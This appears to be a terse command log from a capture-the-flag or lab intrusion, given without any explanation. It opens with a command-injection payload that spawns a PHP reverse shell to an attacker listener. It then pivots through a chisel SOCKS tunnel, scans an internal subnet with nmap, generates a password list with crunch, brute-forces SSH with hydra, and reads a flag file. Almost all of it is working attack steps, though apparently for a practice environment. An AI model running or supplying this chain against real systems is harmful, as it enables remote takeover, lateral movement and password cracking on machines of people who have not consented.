;ls;php -r '$sock=fsockopen("10.0.2.15",1234);exec("/bin/sh -i <&3 >&3 2>&3");';
nc -lvnp 1234
python3 -m http.server 8080
chisel server --reverse -p 3456
. /chisel client 10.0.2.15:3456 R:socks
proxychains nmap 172.18.0.0/24 -Pn
proxychains nmap 172.18.0.3 -Pn -sV -p-
crunch 8 8 "tefeme\!." -o pwds.txt
proxychains hydra 172.18.0.3 ssh -l pablo -P pwds.txt -s 2222
proxychains ssh pablo@172.18.0.3 -p 2222
ls -la
cat .flag.txt